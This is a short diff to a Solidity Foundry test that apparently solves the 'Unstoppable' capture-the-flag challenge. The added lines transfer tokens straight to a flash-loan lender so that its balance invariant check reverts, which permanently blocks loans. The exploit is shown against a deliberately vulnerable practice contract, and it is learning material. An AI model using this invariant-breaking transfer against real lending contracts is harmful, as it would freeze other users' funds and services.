@@ -60,6 +60,13 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        // TODO : break flash loan
+        // cause in function it assume that all users will supply tokens to pool via the depositTokens function
+        // so flash loan function check 'if (poolBalance != balanceBefore) revert AssertionViolated();'
+        // To break this, attacker can provide tokens to pool directly
+        dvt.transfer(address(unstoppableLender), INITIAL_ATTACKER_TOKEN_BALANCE);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
